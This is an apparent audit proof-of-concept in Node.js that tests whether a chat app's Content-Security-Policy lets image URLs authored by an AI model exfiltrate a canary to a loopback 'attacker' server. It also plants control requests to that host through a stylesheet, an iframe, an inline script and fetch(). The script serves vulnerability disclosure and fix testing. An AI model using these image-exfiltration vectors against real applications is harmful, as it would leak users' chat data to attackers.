// Finding 6 PoC, part 2: load the DOM produced by part 1 in headless Chromium,
// served from a loopback HTTPS origin with the exact Content-Security-Policy
// from tinfoil-webapp/vercel.json, and record what reaches a loopback
// "attacker" server. Then repeat with img-src tightened (the proposed fix).
// Nothing leaves 127.0.0.1.
//
// usage: node browser.mjs <rendered-message.html> <vercel.json> <tls-dir>
//        (PLAYWRIGHT_DIR = a directory whose node_modules has playwright)
import { createRequire } from 'node:module'
import https from 'node:https'
import { readFileSync } from 'node:fs'
import path from 'node:path'

const [renderedPath, vercelPath, tlsDir] = process.argv.slice(2)
const require = createRequire(path.join(process.env.PLAYWRIGHT_DIR, 'package.json'))
const { chromium } = require('playwright')
const tls = { key: readFileSync(path.join(tlsDir, 'key.pem')), cert: readFileSync(path.join(tlsDir, 'cert.pem')) }
const ATTACKER = 'https://127.0.0.1:48443'
const APP_PORT = 48444

const vercel = JSON.parse(readFileSync(vercelPath, 'utf8'))
const SHIPPED_CSP = vercel.headers[0].headers.find((h) => h.key === 'Content-Security-Policy').value
const FIXED_CSP = SHIPPED_CSP.replace("img-src 'self' data: blob: https:", "img-src 'self' data: blob:")

const hits = []
const attacker = https.createServer(tls, (req, res) => {
  hits.push(req.url)
  res.writeHead(200, { 'content-type': 'image/png' })
  res.end()
})
await new Promise((r) => attacker.listen(48443, '127.0.0.1', r))

const rendered = readFileSync(renderedPath, 'utf8')
// Page-level negative controls (not model output). They show the CSP header is enforced.
const PAGE =
  '<!doctype html><html><head><meta charset="utf-8"><title>chat (local PoC)</title>' +
  `<link rel="stylesheet" href="${ATTACKER}/ctl?via=external-stylesheet">` +
  '</head><body><main>' + rendered + '</main>' +
  `<iframe src="${ATTACKER}/ctl?via=iframe"></iframe>` +
  `<script>new Image().src="${ATTACKER}/ctl?via=inline-script"</script>` +
  '<script src="/ctl.js"></script></body></html>'
// Same-origin script (allowed by script-src 'self'), standing in for app code: fetch() is governed by connect-src.
const CTL_JS = `fetch("${ATTACKER}/ctl?via=fetch").catch(()=>{})`

let csp = SHIPPED_CSP
const app = https.createServer(tls, (req, res) => {
  if (req.url === '/ctl.js') {
    res.writeHead(200, { 'content-type': 'text/javascript', 'Content-Security-Policy': csp })
    return res.end(CTL_JS)
  }
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'Content-Security-Policy': csp })
  res.end(PAGE)
})
await new Promise((r) => app.listen(APP_PORT, '127.0.0.1', r))

const browser = await chromium.launch({ headless: true, args: ['--ignore-certificate-errors'] })
async function run(label, policy) {
  csp = policy
  hits.length = 0
  const ctx = await browser.newContext({ ignoreHTTPSErrors: true })
  const tab = await ctx.newPage()
  const blocked = []
  tab.on('console', (m) => { if (/Content Security Policy/i.test(m.text()) && !/inline style/.test(m.text())) blocked.push(m.text().slice(0, 110)) })
  await tab.goto(`https://127.0.0.1:${APP_PORT}/chat`, { waitUntil: 'load' })
  await tab.waitForTimeout(1500)
  await ctx.close()
  const leaks = hits.filter((u) => u.startsWith('/x.png'))
  const ctl = hits.filter((u) => u.startsWith('/ctl'))
  console.log(`\n=== ${label}: img-src = ${policy.split(';').map((d) => d.trim()).find((d) => d.startsWith('img-src'))}`)
  for (const u of leaks) console.log('[attacker] GET', u)
  for (const u of ctl) console.log('[attacker] CONTROL GOT THROUGH', u)
  for (const b of blocked) console.log('[csp-blocked]', b)
  console.log(`[poc] ${label}: ${leaks.length} image request(s) carrying the canary reached the attacker; ${ctl.length} control request(s) got through`)
  return { leaks, ctl }
}
const shipped = await run('shipped CSP', SHIPPED_CSP)
const fixed = await run('fixed CSP (control)', FIXED_CSP)
await browser.close(); attacker.close(); app.close()
for (const u of shipped.leaks) console.log('   leaked:', new URL('https://x' + u).searchParams.get('d'), '| via', new URL('https://x' + u).searchParams.get('via'))
const ok = shipped.leaks.length >= 3 && shipped.ctl.length === 0 && fixed.leaks.length === 0 && fixed.ctl.length === 0
console.log(ok ? '\nRESULT: VULNERABLE (shipped CSP lets model-authored images exfiltrate; fixed CSP blocks them)' : '\nRESULT: unexpected')
process.exit(ok ? 0 : 1)
